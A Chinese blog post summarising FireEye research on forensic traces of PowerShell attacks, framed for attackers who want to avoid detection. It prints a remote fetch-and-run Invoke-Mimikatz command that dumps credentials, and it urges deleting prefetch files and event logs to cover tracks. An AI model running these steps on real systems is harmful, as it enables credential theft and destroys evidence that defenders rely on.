# powershell各种反弹姿势以及取证（二）

0x00 简介
=======

* * *

这篇主要是取证的，如果我以后技术好了，也会写写powershell在内网渗透中的实战应用，本文所有的内容基本翻译自fireEyE的`<<Investigating Powershell Attack>>`,我英文不好，有好多地方都看不懂他文章里写的，我磕磕碰碰的看完了这篇文章。有不对的地方，还请小伙伴们补充。

我们都知道，从`windows 7 sp1`和`windows server 2008 R2`开始，就已经默认安装了powershell(2.0版本)，到了`windows Server 2012 R2`和`Window 8.1`就是`powershell 4.0`了。现在用powershell编写的攻击框架也很成熟了，像上文书说的各种协议反弹的SHELL（nishang）；通过`dll loading`技术不写硬盘的，能远程dump登录账号明文的`Mimikatz（PowerSploit）`；以及在`ShmooCon 2013`安全会议上`Chris Campbell`演示的`Powershell Botnet`；还有各种搞windows域内网环境的powerview等；`SET/METASPLOIT`也开始支持powershell版的payloads。我们作为攻击者，也要熟悉现在针对powershell的取证技术，预防自己“艰难进来，轻松被T，却没带走一片云彩”。

原文文章分别从注册表，prefetch,网络流量，内存，日志，自启动这几方面来做取证的。

0x01 注册表：
=========

* * *

默认情况下，除了WinServer 2012R2 会设置`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell的ExecutionPolicy`项为RemoteSigned外，其他的windows系统都会设置为Restricted,有的攻击者为了运行powershell脚本方便，会设置此项为ByPass,但是这种情况并不多见，因为更多的情况是，攻击者使用-ExecuteionPolicy Bypass选项绕过执行策略限制。

0x02 Prefetch:
==============

* * *

Prefetch本意是为了增强系统的性能的，让应用程序下次载入的时候，节省时间。默认路径在`%systemroot%\prefetch`。取证人员常常会通过这些*.PF文件，获取程序最后运行时间，程序访问的文件列表等信息。取证人员有可能通过查看POWERSHELL.EXE-59FC8F3D.pf获取到你运行的攻击PS脚本信息。我这里用的[Prefetch Parser v1.4](http://redwolfcomputerforensics.com/downloads/parse_prefetch_info_v1.4.zip)来查看的，

如图

![enter image description here](http://drops.javaweb.org/uploads/images/118191573b7ec0093fae5c8d1ca84f1f48d9e35a.jpg)

所以每次我们用完powershell，记得`del %systemroot%\prefetch\POWERSHELL.EXE-59FC8F3D.pf`

0x03 网络流量：
==========

* * *

攻击者做内网渗透时，思路通常是先获取了工作组的administrator权限，然后渗透配置不严格的域环境，开启powershell的remoting功能，powershell 2.0的Remoting默认会走`5985(HTTP)`和`5986(HTTPS)`端口，文章里说，主要是监控内网<->内网，DMZ<->内网,VPN<->内网的异常数据流，建模识别出攻击者的非法访问，我想这里能做的，还是要熟悉内网环境，在有正常业务流的内网使用Remoting功能，其他办法我也没想到。

0x04 内存：
========

* * *

论文作者主要是说可以用`Volatility`框架分析`wsmprovhost.exe`进程，能够在内存空间看到XML格式的信息。比如这里他使用`PSSesion`远程交互式SHELL执行了`“echo "helloword" > c:\text.txt”,`然后就可以在`wsmprovhost.exe`的进程里看到信息，如图：

![enter image description here](http://drops.javaweb.org/uploads/images/226b8dfe2ebcb531988839db2f768f50ed86e3db.jpg)

但是这个方法随着远程会话的中止，也将不再有用，要想成功实现取证，需要攻击者正在操作。所以我感觉这个对我们的威胁不是很大。如果开启了winrm，也有可能在`svchost.exe`的进程里看到信息。他这里用的是`Invoke-Mimikatz`做的演示，远程通过下载在内存里执行，DUMP明文密码，不写硬盘，这个渗透技巧实战的时候很有用，命令如下：

```
Invoke-Command -Computername 192.168.114.133 {iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')); Invoke-Mimikatz -DumpCreds}

```

如下是他在svchost.exe进程内存里抓到的信息

![enter image description here](http://drops.javaweb.org/uploads/images/74f823167a5b527f419d52d5391aaed7c75fc463.jpg)

0x05 日志：
========

* * *

Powershell 2.0的默认日志功能还不是很强，powershell 3.0后有所增强，不论是你本地还是通过Remoting执行powershell脚本，都会在下面3个文件里写入日志`%systemroot%\System32\winevt\`

```
windows powershell.evtx

```

每次powershell开始执行`EID 400`或者结束`EID 403`的时候，都会记录。里面的HostName项如果是`ConsoleHost`说明是从本地执行的，反之，是对方的机器名

```
Microsoft-Windows-PowerShell%4Operational.evtx

```

`Microsoft-Windows-power-Shell%4Analytic.etl`[我机器上没有找到这个文件]

如果通过WINRM开启了remoting功能，还会有下面2个日志：

```
Microsoft-Windows-WinRM%4Operational.evtx

```

EID 6会记录remoting的客户端地址信息，在这里可能看到是谁连过来的

```
Microsoft-Windows-WinRM%4Analytic.etl

```

`EID 32850`会记录`remoting`客户端连接过来使用的账号信息`EID 32867/32868`里面有可能会看到当`Invoke-Command`执行命令的时候的细节，如图

![enter image description here](http://drops.javaweb.org/uploads/images/4f7f7c5db316777b743c046f7039261764465352.jpg)

另外随着Microsoft APPLocker的引用，管理员能够对powershell脚本进行更进一步的验证，比如允许哪个PS脚本运行，哪个不允许，甚至禁止掉计算机上全部PS脚本的执行权限等操作，但是这些对我们来说都有已知的技术能绕过，我下回书再说。`AppLocker`功能启用后，`EID 8005`和`EID 8006`会记录认证信息的日志。

作者也提到可以通过`%windir%\system32\WindowsPowerShell\v1.0\profile.ps1`设置全局的profile,来增加额外的日志记录，他这里说可以用-NoProfile来绕过，上文书我实践过，发现是不可以的，参考上文，这里不多提了。

Powershell 3.0引入了`Module Logging`的能力，可以通过组策略开启`（Computer Configuration → Administrative Templates →Windows Components →Windows PowerShell →Turn on Module Logging）`，开启后，可以在EID 4103里看到ps脚本执行后的结果，比如我执行

```
Get-ChildItem c:\temp -Filter *.txt -Recurse | Select-String password

```

意思是搜索`C:\`下所有TXT里包含password的文件，可以在`EID 4103`里看到返回结果，如图

![enter image description here](http://drops.javaweb.org/uploads/images/036889981005c200f3de7dbf4cec506e05506d4f.jpg)

甚至Invoke-Mimikatz执行的结果也会记录，如图

![enter image description here](http://drops.javaweb.org/uploads/images/1e66670bf5167dcb25f57d4fde39b95e29e09040.jpg)

再次提醒我们，该删日志，一定要删，外面应该有能删指定日志的工具了，不过我没见到，有的发我一份。

0x06 自启动：
=========

* * *

Powershell经常通过注册表，开始菜单，或者计划任务来实现自启动的目的，通常用sysinternals的autorun就能找到了。另外`C:\Users\<USERNAME>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1`可以达到和`C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1`一样的效果。

**_文章参考：_**

https://www.blackhat.com/docs/us-14/materials/us-14-Kazanciyan-Investigating-Powershell-Attacks-WP.pdf

https://www.defcon.org/images/defcon-22/dc-22-presentations/Kazanciyan-Hastings/DEFCON-22-Ryan-Kazanciyan-Matt-Hastings-Investigating-Powershell-Attacks.pdf